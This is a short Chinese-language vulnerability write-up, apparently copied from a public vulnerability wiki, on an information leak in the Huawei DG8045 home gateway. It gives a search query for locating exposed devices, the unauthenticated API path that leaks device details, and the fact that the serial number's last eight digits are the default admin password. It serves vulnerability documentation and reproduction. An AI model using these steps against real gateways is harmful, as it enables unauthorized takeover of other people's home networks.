---
title: "Huawei DG8045 deviceinfo 信息泄漏漏洞"
date: 2026-10-18 09:14:48
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "Huawei-DG8045-deviceinfo"
tags:
  - "Huawei-DG8045-deviceinfo"
  - "信息泄露"
  - "漏洞复现"
---
## 漏洞描述

Huawei DG8045 deviceinfo api接口存在信息泄漏漏洞，攻击者通过泄漏的信息可以获得账号密码登录后台

## 漏洞影响

```
Huawei DG8045
```

## 网络测绘

```
app="DG8045-Home-Gateway-DG8045"
```

## 漏洞复现

登录页面

![image-20220519181753641](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202205191817718.png)

验证POC

```
/api/system/deviceinfo
```

![image-20220519181803482](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202205191818539.png)

SerialNumber 后8位即为初始密码

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/Huawei-DG8045-deviceinfo-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.md)
